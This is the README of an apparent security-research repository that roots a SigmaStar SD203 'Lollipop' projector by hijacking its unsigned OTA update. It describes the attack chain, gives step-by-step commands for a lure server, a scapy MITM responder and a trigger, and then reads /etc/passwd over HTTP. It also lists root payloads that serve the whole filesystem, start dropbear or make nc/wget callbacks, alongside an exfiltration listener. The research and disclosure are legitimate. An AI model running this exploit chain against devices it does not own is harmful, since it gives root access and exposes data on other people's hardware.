# lollipop-beamer-root

Root shell / root filesystem access on a **SigmaStar SD203-based "Lollipop" pico
projector** (model string `sd203_6710_yro8__SSW105AT`, firmware `V2.1.0.2-R`,
web UI `Boa/0.94.13`).

Everything here was derived from the device's own firmware and from live
traffic on the owner's LAN. **Use only on hardware you own.**

---

## TL;DR

The web UI is a dead end (no command injection, no traversal — see
`docs/02-boa-audit.md`). The OTA client is not:

```
ota_host_en = 43.254.2.156:8000/ota/rgl/sd203_6710_yro8__SSW105AT
    |
    +-- GET  http://<ota_host>/config.txt      -> version compare
    +-- GET  http://<ota_host>/sd203ota.bin.gz -> /tmp/sd203ota.bin.gz
    +-- GET  http://<ota_host>/otaunpack       -> /tmp/otaunpack
    +-- chmod 777 /tmp/otaunpack
    +-- fork()/execlp("otaunpack","otaunpack","-x","/tmp/sd203ota.bin.gz")
```

There is **no signature check** — only MD5 over files whose MD5 the server
itself supplies. `otaunpack` is executed as **root**. If you control the
download (ARP/L2, because the device routes through your AP), you can serve
your own `otaunpack` — a shell script — and it runs as root.

The firmware image is only used for `config.txt`, so the package can be a
placeholder. No flash is written as long as your `otaunpack` does not call the
real unpacker.

---

## Requirements

- You are the L2 next hop for the device (typical: you run the AP it joins).
- Linux, Python 3.9+, `scapy` (for the userspace TCP responder).
- `net.ipv4.ip_forward=0` on the host, otherwise the kernel forwards the
  device's OTA packets to the real vendor and races your responder.
- Optional: `PySquashfsImage` for firmware extraction.

```sh
python3 -m pip install -r tools/requirements.txt
sudo sysctl -w net.ipv4.ip_forward=0       # important, see docs/03
```

---

## Quick start

```sh
# 0. adjust IPs/MACs to your setup (defaults match the original device)
#    device 10.42.0.31 / d0:7c:b2:17:f7:46
#    host   10.42.0.1  / (auto-detected)

# 1. start the lure HTTP server (also generates config.txt from the payload)
python3 tools/ota_lure_server.py \
    --root ./lure --payload payloads/otaunpack_root_boa.sh \
    --major 1 --middle 0 --minor 3 --small R

# 2. start the userspace TCP responder (needs root for raw sockets)
sudo python3 tools/ota_mitm.py --iface wlan0 --client 10.42.0.31

# 3. trigger the OTA check (or just wait for the device's periodic poll)
python3 tools/trigger.py --target 10.42.0.31 --wait

# 4. read the root filesystem through the payload's own boa
curl http://10.42.0.31/etc/passwd
curl http://10.42.0.31/proc/mounts
curl http://10.42.0.31/tmp/ota_payload.log
```

After the payload's grace period it exits, the vendor client reboots the
device and everything is back to normal.

---

## What each payload does

| payload | effect |
|---|---|
| `payloads/otaunpack_root_boa.sh` | writes a second `boa.conf` with `DocumentRoot /` and starts the vendor `boa` on port 80 (+8080). Result: **whole root filesystem over HTTP**. No busybox needed. |
| `payloads/otaunpack_recon.sh` | dumps `id`, `uname`, `/proc/mounts`, directory listings to `/tmp/ota_payload.log` and tries `nc`/`wget` callbacks. Useful if you already have a listener. |
| `payloads/otaunpack_dropbear.sh` | the real end-state payload: starts inetd, the root-fs boa **and** dropbear from `/appconfigs`, then blocks forever so the device does not reboot. |
| `payloads/otaunpack_dropbear_stub.sh` | earlier template, kept for reference. |

Notes from the field:

- The device's rootfs is **very** minimal. `busybox` exists but the usual
  applets (`telnetd`, `nc`, `httpd`, `wget`) were not available in the tested
  build — do not rely on them. The vendor `boa` binary is the reliable tool.
- `otasrv` calls `otakill_stop_services` **before** executing `otaunpack`, so
  the web UI is down while your payload runs. The payload therefore has to
  re-expose something itself.
- If your payload blocks forever, `otasrv` stays in `waitpid()` and never
  reboots — the device is then unreachable until a power cycle. Keep a
  timeout in the payload.

---

## Firmware

`tools/fw_download.py` fetches the vendor OTA package and verifies the MD5s
from `config.txt`:

```sh
python3 tools/fw_download.py --list                      # show available models
python3 tools/fw_download.py --out ./fw                  # download + verify
python3 tools/extract_fw.py ./fw/sd203ota.bin.gz --out ./fw/extracted --extract
```

`extract_fw.py` carves the two SquashFS images (`/config` and `/customer`) out
of the vendor container and extracts them if `PySquashfsImage` is installed.
The `/customer` image contains the complete web UI, all 24 CGIs, `boa.conf`,
`otasrv`, `sd20x_manage` and the shared libraries — i.e. everything needed to
audit the device offline.

---

## Repository layout

```
docs/                  findings, evidence, negative results
payloads/              otaunpack replacements (shell scripts, run as root)
tools/fw_download.py   vendor OTA downloader + MD5 verification
tools/extract_fw.py    carve + extract SquashFS from the vendor container
tools/ota_lure_server.py  HTTP lure + exfiltration listener + config generator
tools/ota_mitm.py      userspace TCP responder (scapy, no iptables needed)
tools/trigger.py       waits for the device and POSTs ota_start.cgi
```

---

## Why not the web UI?

All 24 CGIs were audited statically and the interesting ones tested live:

- `playUrl.cgi` looks like `system("/system/bin/mediaplayertest -f %s")` with
  an unquoted `%s`, but disassembly shows the argument is the **literal**
  `/data/video_url`; the request value is only written into that file.
- `media_control.cgi`, `scan.cgi`, `settings.cgi`, `dialog.cgi`,
  `password.cgi`, `key.cgi`, `debug.cgi` — no request-controlled shell sink.
- Network CGIs use unix-socket IPC, not a shell.
- `boa_indexer` is not built and `DirectoryMaker` is not configured, so the
  known indexer overflow is not reachable.
- Boa path traversal attempts (`..`, `%00`, double encoding, PATH_INFO) are
  rejected.

See `docs/02-boa-audit.md` for the full table and the exact strings.

---

## Legal

This is security research on hardware owned by the author. Publishing an
exploit for a device you own is fine in most jurisdictions; using it against
someone else's device is not. The vendor OTA host is referenced only as it
appears in the device's own configuration — do not attack it.

No warranty. Flashing/modifying firmware can brick a device.
